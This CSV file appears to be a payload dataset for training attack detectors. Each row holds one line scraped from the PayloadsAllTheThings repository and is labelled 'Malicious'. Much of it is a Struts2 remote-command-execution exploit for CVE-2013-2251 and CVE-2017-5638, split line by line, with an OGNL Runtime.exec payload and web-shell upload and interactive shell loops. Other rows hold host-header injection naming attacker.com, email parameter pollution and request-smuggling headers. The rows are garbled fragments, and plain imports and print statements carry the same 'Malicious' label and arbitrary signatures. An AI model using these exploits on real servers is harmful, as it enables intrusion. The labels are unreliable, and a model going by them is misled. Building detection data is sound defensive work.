Payload,Signature,AttackType,Severity,MITRE,Label,Description
"print(""Found by Mikhail Klyuchnikov"")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"print("""")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  print(""[-] No URL provided"")",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
  sys.exit(0),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
while True:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    try:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"      command = input(""command > "")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
      if r.status_code == 200:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(""[+] Bookmark added"")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
      else:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(""\n[-] Target not vulnerable or something went wrong"")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        sys.exit(0),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"      print(""[+] Result of the command: \n"")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
      print(replaced),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
    except KeyboardInterrupt:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"            print(""Exiting..."")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            break,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Accept: */*,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Content-Type: application/json,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Host: attacker.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# parameter pollution,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com&email=hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# array of emails,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# carbon copy,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com%0A%0Dcc:hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com%0A%0Dbcc:hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
# separator,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com%20hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
email=victim@mail.com|hacker@mail.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
malicious_payload,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[...],GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
cd smuggler,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
python3 smuggler.py -h,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
X:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
malicious_payload,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Transfer-Encoding: chunked,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Host: something.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
User-Agent: Smuggler/v1.0,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Content-Length: 83,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
0,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
X: X,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
Host: attacker.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
X-Forwarded-Host: attacker.com,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
3. Then use the token in an URL like ",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* Attacker account: """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"2. Craft a request which will overwrite the """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"docker run -v $PWD:/workdir davidanson/markdownlint-cli2:v0.15.0 ""**/*.md"" --config .github/.markdownlint.json --fix",CMDi_Unix,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
whoami,CMDi_Unix,Generic Payload,High,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
[REDACTED],GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
10.10.10.10,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
10.10.10.11,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
User,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
P@ssw0rd,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
DC01,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
EXCHANGE01,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
WORKSTATION01,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
author,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
title,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
link,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
date,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
markdownlint,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,Generic Payload,Medium,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
#!/usr/bin/python,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
from __future__ import print_function,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
from future import standard_library,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
standard_library.install_aliases(),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
from builtins import input,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
from builtins import str,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import time,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import sys,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import os,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import subprocess,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import requests,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import readline,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
import urllib.parse,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
RED = '\033[1;31m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
BLUE = '\033[94m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
BOLD = '\033[1m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
GREEN = '\033[32m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
OTRO = '\033[36m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
YELLOW = '\033[33m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
ENDC = '\033[0m',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
def cls():,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
cls(),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
logo = BLUE+''',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
  ___   _____  ___    _   _  _____  ___,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 (  _`\(_   _)|  _`\ ( ) ( )(_   _)(  _`\,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 | (_(_) | |  | (_) )| | | |  | |  | (_(_),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 ( )_) | | |  | |\ \ | (_) |  | |  ( )_) |,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
 `\____) (_)  (_) (_)(_____)  (_)  `\____),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        =[ Command Execution v3]=,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
              By @s1kr10s,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
'''+ENDC,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
print(logo),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
host = input(BOLD+"""" [+] HOST: """"+ENDC)""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
if len(host) > 0:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        def exploit(comando):,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            return exploit,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        def exploit2(comando):,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            return exploit2,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        def exploit3(comando):,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"            exploit3 = ""%24%7B%28%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23a%3D@java.lang.Runtime@getRuntime%28%29.exec%28%27""+comando+""%27%29.getInputStream%28%29%2C%23b%3Dnew%20java.io.InputStreamReader%28%23a%29%2C%23c%3Dnew%20%20java.io.BufferedReader%28%23b%29%2C%23d%3Dnew%20char%5B51020%5D%2C%23c.read%28%23d%29%2C%23sbtest%3D@org.apache.struts2.ServletActionContext@getResponse%28%29.getWriter%28%29%2C%23sbtest.println%28%23d%29%2C%23sbtest.close%28%29%29%7D""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            return exploit3,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        def pwnd(shellfile):,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            return exploitfile,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        def validador():,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            return arr_lin_win,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        #       print ""perl""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        #       print ""python""",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        # CVE-2013-2251 ---------------------------------------------------------------------------------,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        try:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            response = '',GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            response = urllib.request.urlopen(host+poc),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        except:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"            print(RED+"" Servidor no responde\n""+ENDC)",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            exit(0),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(BOLD+""\n [+] EJECUTANDO EXPLOIT CVE-2013-2251""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        if response.read().find(""mamalo"") != -1:",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"            print(RED+""   [-] VULNERABLE""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            owned.write(str(host)+'\n'),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            owned.close(),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"            opcion = input(YELLOW+""   [-] RUN THIS EXPLOIT (s/n): ""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"            #print BOLD+""   * [SHELL REVERSA]""+ENDC",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            if opcion == 's':,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                print(YELLOW+""   [-] GET PROMPT...\n""+ENDC)",DirTraversal_Path,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                time.sleep(1),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                print(BOLD+""   * [UPLOAD SHELL]""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                print(OTRO+""     Struts@Shell:$ pwnd (php)\n""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                while 1:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                    separador = input(GREEN+""Struts2@Shell_1:$ ""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    espacio = separador.split(' '),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    if espacio[0] != 'reverse' and espacio[0] != 'pwnd':,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                        shell = urllib.request.urlopen(host+exploit(""'""+str(comando)+""'""))",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                        print(""\n""+shell.read())",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    elif espacio[0] == 'pwnd':,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                        pathsave=input(""path EJ:/tmp/: "")",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                        if espacio[1] == 'php':,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                            urllib.request.urlopen(host+pwnd(str(shellfile))),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                            if shell.read().find(pathsave+""status.php"") != -1:",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                                print(BOLD+GREEN+""\nCreate File Successful :) [""+pathsave+""status.php]\n""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                            else:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                                print(BOLD+RED+""\nNo Create File :/\n""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        # CVE-2017-5638 ---------------------------------------------------------------------------------,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(BLUE+""     [-] NO VULNERABLE""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"        print(BOLD+"" [+] EJECUTANDO EXPLOIT CVE-2017-5638""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        x = 0,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
        while x < len(validador()):,CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            valida = validador()[x],CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
            try:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                result = urllib.request.urlopen(req).read(),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                if result.find(""ASCII"") != -1 or result.find(""No such"") != -1 or result.find(""Directory of"") != -1 or result.find(""Volume Serial"") != -1 or result.find(""inet"") != -1 or result.find(""root:"") != -1 or result.find(""uid="") != -1 or result.find(""accounts"") != -1 or result.find(""Cuentas"") != -1:",CMDi_Unix,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                    print(RED+""   [-] VULNERABLE""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    owned.write(str(host)+'\n'),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    owned.close(),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                    opcion = input(YELLOW+""   [-] RUN THIS EXPLOIT (s/n): ""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                    if opcion == 's':,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                        print(YELLOW+""   [-] GET PROMPT...\n""+ENDC)",DirTraversal_Path,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                        time.sleep(1),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                        while 1:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                            try:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                                separador = input(GREEN+""\nStruts2@Shell_2:$ ""+ENDC)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                                result = urllib.request.urlopen(req).read(),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"                                print(""\n""+result)",GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                            except:,GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
                                exit(0),GenericPayload_Generic,Generic Payload,Low,T1190,Malicious,Generic Payload payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
